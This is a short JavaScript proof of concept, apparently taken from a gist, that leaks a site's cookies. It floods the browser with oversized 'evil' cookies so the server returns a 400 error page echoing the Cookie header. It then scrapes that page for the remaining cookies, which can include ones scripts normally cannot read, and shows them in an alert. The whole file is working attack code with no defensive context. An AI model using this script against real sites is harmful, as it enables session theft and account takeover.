// Source: https://gist.github.com/1955a1c28324d4724b7b/7fe51f2a66c1d4a40a736540b3ad3fde02b7fb08
// Most browsers limit cookies to 4k characters, so we need multiple
function setCookies (good) {
    // Construct string for cookie value
    var str = "";
    for (var i=0; i< 819; i++) {
        str += "x";
    }
    // Set cookies
    for (i = 0; i < 10; i++) {
        // Expire evil cookie
        if (good) {
            var cookie = "xss"+i+"=;expires="+new Date(+new Date()-1).toUTCString()+"; path=/;";
        }
        // Set evil cookie
        else {
            var cookie = "xss"+i+"="+str+";path=/";
        }
        document.cookie = cookie;
    }
}
function makeRequest() {
    setCookies();
    function parseCookies () {
        var cookie_dict = {};
        // Only react on 400 status
        if (xhr.readyState === 4 && xhr.status === 400) {
            // Replace newlines and match <pre> content
            var content = xhr.responseText.replace(/\r|\n/g,'').match(/<pre>(.+)<\/pre>/);
            if (content.length) {
                // Remove Cookie: prefix
                content = content[1].replace("Cookie: ", "");
                var cookies = content.replace(/xss\d=x+;?/g, '').split(/;/g);
                // Add cookies to object
                for (var i=0; i<cookies.length; i++) {
                    var s_c = cookies[i].split('=',2);
                    cookie_dict[s_c[0]] = s_c[1];
                }
            }
            // Unset malicious cookies
            setCookies(true);
            alert(JSON.stringify(cookie_dict));
        }
    }
    // Make XHR request
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = parseCookies;
    xhr.open("GET", "/", true);
    xhr.send(null);
}
makeRequest();
